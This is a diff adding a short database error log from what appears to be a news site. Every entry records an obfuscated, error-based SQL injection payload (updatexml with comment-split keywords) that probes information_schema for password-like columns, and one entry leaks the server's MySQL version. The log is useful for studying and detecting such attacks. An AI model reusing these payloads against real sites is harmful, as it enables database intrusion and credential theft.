@@ -1,0 +1,16 @@
+Time : 21:08:29
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!0?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,count(t./**//**/tAbLe_NaMe),0x3f7e21))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t./**//**/tAbLe_ScHeMa = d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c./**//**/tAbLe_ScHeMa = d./**//**/sChEmA_nAmE and c./**//**/tAbLe_NaMe = t./**//**/tAbLe_NaMe /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**//**/sChEmA_nAmE = /**//**/dAtAbAsE() and c./**//**/cOlUmN_nAmE like 0x25637625)),0)
+
+Time : 21:08:28
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!0?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,count(t./**//**/tAbLe_NaMe),0x3f7e21))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t./**//**/tAbLe_ScHeMa = d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c./**//**/tAbLe_ScHeMa = d./**//**/sChEmA_nAmE and c./**//**/tAbLe_NaMe = t./**//**/tAbLe_NaMe /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**//**/sChEmA_nAmE = /**//**/dAtAbAsE() and c./**//**/cOlUmN_nAmE like 0x2570617325)),0)
+
+Time : 21:08:27
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!0?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,count(t./**//**/tAbLe_NaMe),0x3f7e21))) /**//**/fRoM information_schema./**//**/sChEmAtA as d join information_schema./**//**/tAbLeS as t on t./**//**/tAbLe_ScHeMa = d./**//**/sChEmA_nAmE join information_schema./**//**/cOlUmNs as c on c./**//**/tAbLe_ScHeMa = d./**//**/sChEmA_nAmE and c./**//**/tAbLe_NaMe = t./**//**/tAbLe_NaMe /**//**/wHeRe not c./**//**/tAbLe_ScHeMa in(0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c) and d./**//**/sChEmA_nAmE = /**//**/dAtAbAsE() and c./**//**/cOlUmN_nAmE like 0x25707725)),0)
+
+Time : 21:08:26
+SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '?~!5.7.25-log?~!'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=updatexml(rand(),(/**//**/sElEcT /**//**/uNhEx(/**//**/hEx(/**//**/cOnCaT(0x3f7e21,version(),0x3f7e21)))),0)
+
